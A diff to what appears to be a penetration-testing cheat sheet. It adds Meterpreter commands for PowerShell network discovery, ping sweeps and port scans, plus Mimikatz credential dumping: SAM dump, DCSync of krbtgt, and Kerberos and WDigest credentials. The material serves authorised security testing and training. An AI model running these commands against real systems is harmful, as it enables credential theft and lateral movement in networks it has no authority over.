@@ -2390,11 +2390,11 @@ cp /tmp/poc.svg /var/www/html/convert_images/
 #### Metasploit
 
 ```c
-sudo msfdb run                     // start database
-sudo msfdb init                    // database initialization
-msfdb --use-defaults delete        // delete existing databases
-msfdb --use-defaults init          // database initialization
-msfdb status                       // database status
+$ sudo msfdb run                   // start database
+$ sudo msfdb init                  // database initialization
+$ msfdb --use-defaults delete      // delete existing databases
+$ msfdb --use-defaults init        // database initialization
+$ msfdb status                     // database status
 msf6> workspace                    // metasploit workspaces
 msf6> workspace -a <WORKSPACE>     // add a workspace
 msf6> workspace -r <WORKSPACE>     // rename a workspace
@@ -2446,7 +2446,23 @@ meterpreter > upload                             // uploading local files to the
 meterpreter > ipconfig                           // get network configuration
 meterpreter > load powershell                    // loads powershell
 meterpreter > powershell_shell                   // follow-up command for load powershell
+meterpreter > powershell_execute                 // execute command
+meterpreter > powershell_import                  // import module
+meterpreter > powershell_shell                   // shell
+meterpreter > powershell_session_remove          // remove
+meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                            // network discovery
+meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
+meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                 // port scan
 meterpreter > load kiwi                          // load mimikatz
+meterpreter > help kiwi                          // mimikatz help
+meterpreter > kiwi_cmd                           // execute mimikatz native command
+meterpreter > lsa_dump_sam                       // lsa sam dump
+meterpreter > dcsync_ntlm krbtgt                 // dc sync
+meterpreter > creds_all                          // dump all credentials
+meterpreter > creds_msv                          // msv dump
+meterpreter > creds_kerberos                     // kerberos dump
+meterpreter > creds_ssp                          // ssp dump
+meterpreter > creds_wdigest                      // wdigest dump
 meterpreter > getprivs                           // get privileges after loading mimikatz
 meterpreter > getsystem                          // gain system privileges if user is member of administrator group
 meterpreter > hashdump                           // dumps all the user hashes
